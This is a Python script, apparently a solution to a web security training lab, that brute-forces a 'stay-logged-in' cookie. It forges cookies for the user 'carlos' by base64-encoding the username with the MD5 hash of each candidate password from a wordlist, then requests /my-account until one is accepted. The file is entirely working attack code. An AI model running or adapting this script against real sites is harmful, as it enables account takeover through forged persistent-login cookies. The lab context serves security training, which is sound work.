"""
  Lab: Brute-forcing a stay-logged-in cookie

  Steps:
  1. Read password list from file
  2. Craft the stay-logged-in cookie for user 'carlos' and Brute-force the password 
     using it
  3. Use the valid stay-logged-in cookie to access /my-account

  Author: N00BCYB0T
"""
import argparse
from colorama import Fore

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from base64 import b64encode
from hashlib import md5

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL")
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://http://127.0.0.1:8080)')
    args = parser.parse_args()

    print(f"{Fore.BLUE}Starting...{Fore.RESET}")
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print(f"{Fore.YELLOW}STEP 1:{Fore.RESET} Reading password list from file...")
    passwords = read_passwords()
    
    ok = brute_force(args.url, session, passwords)

    if "Update email" in ok.text:
        print(f"\n{Fore.GREEN}[x] Lab solved!{Fore.RESET}")


def read_passwords():
    try:
        with open('../passwords.txt', 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
            return passwords
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Password list file not found.{Fore.RESET}")
        exit(1)

def craft_stay_logged_in(username, password):
    cookie_format = f"{username}:{md5(password.encode()).hexdigest()}"
    return b64encode(cookie_format.encode()).decode()

def brute_force(url, session, passwords):
    for password in passwords:
        cookie = craft_stay_logged_in('carlos', password)
        if not cookie:
            print(f"{Fore.RED}Failed to craft cookie.{Fore.RESET}")
            exit(1)

        session.cookies.set('stay-logged-in', cookie)
        print(f"{Fore.YELLOW}STEP 2:{Fore.RESET} Brute-forcing password: {password:20}", end='\r', flush=True)
        response = session.get(f"{url}/my-account?id=carlos", allow_redirects=False)

        if response.status_code == 200:
            return response

if __name__ == "__main__":
    main()
                
        